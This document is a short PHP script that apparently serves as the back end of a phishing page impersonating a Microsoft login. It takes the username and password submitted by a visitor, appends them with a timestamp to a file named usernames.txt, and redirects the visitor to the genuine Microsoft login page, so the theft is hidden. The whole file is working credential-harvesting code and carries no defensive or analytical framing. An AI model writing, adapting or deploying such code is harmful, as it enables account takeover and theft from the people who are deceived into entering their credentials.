<?php
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

$entry = "Microsoft | Username: " . $username . " | Pass: " . $password . " | Time: " . date('Y-m-d H:i:s') . "\n";
file_put_contents("usernames.txt", $entry, FILE_APPEND);

// Redirect to real Microsoft login
header('Location: https://login.live.com/');
exit();
?>